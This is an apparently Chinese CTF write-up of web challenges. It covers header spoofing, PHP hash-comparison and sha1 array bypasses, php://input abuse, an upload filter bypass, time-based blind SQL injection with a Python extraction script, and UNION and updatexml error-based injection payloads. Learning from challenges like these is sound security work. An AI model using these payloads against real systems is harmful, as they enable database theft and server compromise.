<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示 are you from google?</p>
<p>你是从google来的吗</p>
<p>考察http头中的referer参数</p>
<p><strong>Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br>例如：Referer：<a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com/</a></strong> </p>
<p>那么就抓包修改referer这个参数</p>
<p><code>Referer: https://www.google.com/</code>,直接go即可</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md51</span> = md5(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line"><span class="function"><span class="title">sha1</span><span class="params">(<span class="string">&#x27;aaroZmOk&#x27;</span>)</span></span>  </span><br><span class="line"><span class="function"><span class="title">sha1</span><span class="params">(<span class="string">&#x27;aaK1STfY&#x27;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">sha1</span><span class="params">(<span class="string">&#x27;aaO8zKZF&#x27;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">sha1</span><span class="params">(<span class="string">&#x27;aa3OFF9m&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure>



<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>见到题目就想到了<code>x-forwarded-for</code>，本地地址可以使用IP:127.0.0.1</p>
<p>可以使用google浏览器的插件<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" alt></p>
<p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" alt></p>
<p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" alt></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先看一下要传入哪些变量</p>
<p>get:id uname</p>
<p>post:passwd</p>
<p>id需要进行一次urldecode，解码的值为margin</p>
<p>uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。</p>
<p>payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">urlencode</span>(margin)=%<span class="number">6</span>D%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">69</span>%<span class="number">6</span>E</span><br><span class="line"><span class="attribute">uname</span>[]=<span class="number">1</span></span><br><span class="line"><span class="attribute">passwd</span>[]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GET</span>: id=%<span class="number">6</span>D%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">69</span>%<span class="number">6</span>E&amp;uname[]=<span class="number">1</span></span><br><span class="line"><span class="attribute">POST</span>:passwd[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" alt></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$f</span> = trim(file_get_contents(<span class="variable">$fn</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>extract</strong>函数作用</p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>extract — 从数组中将变量导入到当前的符号表</p>
<p>说明</p>
<p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p>
<p>本函数用来将变量从数组中导入到当前的符号表中。</p>
<p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
<p><strong>trim</strong></p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>说明</p>
<p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = “ \t\n\r\0\x0B” ] ) : string</p>
<p>此函数返回字符串 <code>str</code> 去除首尾空白字符后的结果。如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p>
<ul>
<li>“ “ (ASCII <code>32</code> (<code>0x20</code>))，普通空格符。</li>
<li>“\t” (ASCII <code>9</code> (<code>0x09</code>))，制表符。</li>
<li>“\n” (ASCII <code>10</code> (<code>0x0A</code>))，换行符。</li>
<li>“\r” (ASCII <code>13</code> (<code>0x0D</code>))，回车符。</li>
<li>“\0” (ASCII <code>0</code> (<code>0x00</code>))，空字节符。</li>
<li>“\x0B” (ASCII <code>11</code> (<code>0x0B</code>))，垂直制表符。</li>
</ul>
<p><strong>file_get_contents</strong></p>
<p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p>
<p>file_get_contents — 将整个文件读入一个字符串</p>
<p>代码的大致含义就是</p>
<p>get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag</p>
<p>这里需要利用php的伪协议写入内容 php://input</p>
<p>payload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span> ac=<span class="number">111</span><span class="variable">&amp;fn</span>=php:<span class="comment">//input</span></span><br><span class="line"><span class="symbol">POST:</span> <span class="number">111</span></span><br></pre></td></tr></table></figure>



<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>题目网站崩了</p>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>文件上传</p>
<p>首先先上传一个图片文件，上传成功了并返回保存路径</p>
<p>再上传一个php的文件，提示<code>Invalid file</code></p>
<p>上传.htaccess, .user.ini都提示<code>you got it</code></p>
<p>两种提示不一样猜测可能存在后缀黑名单和文件类型检测。</p>
<p>上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file </p>
<p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" alt="getshell1.png"></p>
<p>再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag</p>
<p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" alt="getshell2.png"></p>
<p>考察知识点：</p>
<p><strong>请求中的Content-Type</strong></p>
<p>在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。</p>
<p><strong>设置请求头中的Content-Type</strong></p>
<p>当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。</p>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>提示了insert into注入</p>
<p>并给出了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123; <span class="comment">//判断是否存在xxf</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];		<span class="comment">//存在则优先使用xxf</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];				<span class="comment">//remote_addr	</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ip_arr</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ip</span>);				<span class="comment">//过滤 ,</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip_arr</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$host</span>=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = mysql_connect(<span class="variable">$host</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to connect&quot;</span>);<span class="comment">//连接数据库</span></span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="variable">$db</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to select database&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;your ip is :&#x27;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into client_ip (ip) values (&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>; <span class="comment">//注入点</span></span><br><span class="line">mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。</p>
<p>抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip_arr</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ip</span>);   <span class="regexp">//</span>过滤了,</span><br></pre></td></tr></table></figure>

<p>代替if的注入语句如下</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> 语句<span class="number">1</span> <span class="keyword">then</span> 语句<span class="number">2</span> <span class="keyword">else</span> 语句<span class="number">3</span> <span class="keyword">end</span>;</span><br><span class="line">//含义很好理解，就是当语句<span class="number">1</span>为真时，执行语句<span class="number">2</span>，否则执行语句<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>所以要构造的注入语句为</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">11&#x27;+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="built_in">length</span>(<span class="keyword">database</span>())=<span class="number">5</span> <span class="keyword">then</span> sleep(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>))%<span class="number">23</span></span><br><span class="line">//当数据库名的长度为<span class="number">5</span>时，则执行sleep(<span class="number">5</span>)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确</span><br></pre></td></tr></table></figure>

<p>带入原语句</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> client_ip (ip) <span class="keyword">values</span> (<span class="string">&#x27;$ip&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> client_ip (ip) <span class="keyword">values</span> (<span class="string">&#x27;11&#x27;</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="built_in">length</span>(<span class="keyword">database</span>())=<span class="number">5</span> <span class="keyword">then</span> sleep(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>))%<span class="number">23</span></span><br><span class="line">//可以看到语句成功注入到原查询语句中，并可以正常执行</span><br></pre></td></tr></table></figure>

<p>判断字段每一个字符的值</p>
<p>常用的语句应该为</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">and</span> (<span class="keyword">case</span> <span class="keyword">when</span> (substr(<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;c&#x27;</span> <span class="keyword">then</span> sleep(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>) #</span><br></pre></td></tr></table></figure>

<p>但是因为逗号被过滤了，所以改为下面的语句</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">and</span> (<span class="keyword">case</span> <span class="keyword">when</span> (substr(<span class="keyword">select</span> database()) from <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">&#x27;c&#x27;</span> <span class="keyword">then</span> sleep(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>) #</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##client_ip,flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    print(<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">129</span>):</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">128</span>:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        sqli = sql.<span class="built_in">format</span>(i, <span class="built_in">chr</span>(ch))</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For&#x27;</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = requests.get(url, headers=header, timeout=<span class="number">3</span>) <span class="comment">#响应时间超过3秒则 进入except 即可猜测是正确的</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>网址打不开</p>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>tips</p>
<blockquote>
<p>本题有2个flag<br>flag均为小写<br>flag格式 flag{}</p>
</blockquote>
<p>看到题目提示，应该是二次注入</p>
<p>url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 <code>There is nothing</code></p>
<p>输入 id=1’or 1=1–+ 报错</p>
<p>但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;^(<span class="built_in">length</span>(<span class="string">&#x27;union&#x27;</span>)!=<span class="number">0</span>)--+</span><br><span class="line">页面显示错误正常说明<span class="built_in">length</span>(<span class="string">&#x27;union&#x27;</span>)!=<span class="number">0</span>是错的，即<span class="built_in">length</span>(<span class="string">&#x27;union&#x27;</span>)=<span class="number">0</span>，说明union替换为空了</span><br><span class="line">其他关键词的测试也类似</span><br></pre></td></tr></table></figure>

<p>开始注入</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">database:flag1,hint</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> ununionion seselectlect <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> infoorrmation_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flag1&#x27;</span><span class="comment">--+</span></span><br><span class="line"><span class="keyword">table</span>:flag1,address</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</span></span><br><span class="line"><span class="string">usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入</span></span><br><span class="line"><span class="string">-1&#x27;</span> ununionion seselectlect <span class="number">1</span>,group_concat(address) <span class="keyword">from</span> flag1 <span class="comment">--+</span></span><br><span class="line">拿到下一关的地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/11/23/uMT6Q7oaNHJEcbv.png" alt="sqls-1.png"></p>
<p>同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入</p>
<p><img src="https://i.loli.net/2020/11/23/KBepFMZsYRPHaW8.png" alt="sqls-2.png"></p>
<p>报错注入一般是固定的模板</p>
<p>下面使用updatexml()进行注入</p>
<blockquote>
<p>函数语法：updatexml(XML_document, XPath_string, new_value);</p>
<p>适用版本: 5.1.5+<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<p>我们通常在第二个xpath参数填写我们要查询的内容。</p>
</blockquote>
<p>payload</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>~<span class="string">&#x27;),3) %23</span></span><br><span class="line"><span class="string">database:~class,flag2~</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flag2&#x27;</span>),<span class="string">&#x27;~&#x27;</span>),<span class="number">3</span>) %<span class="number">23</span></span><br><span class="line"><span class="keyword">table</span>:~flag2,address~</span><br><span class="line"># 查数据</span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="number">0x7e</span><span class="string">&#x27;,(select flag2 from flag2),&#x27;</span><span class="number">0x7e</span><span class="string">&#x27;),3) %23</span></span><br><span class="line"><span class="string"> 拿到真正的flag</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" alt="sqls-flag.png"></p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可</p>
<p>加密后的数据为</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</span><br></pre></td></tr></table></figure>

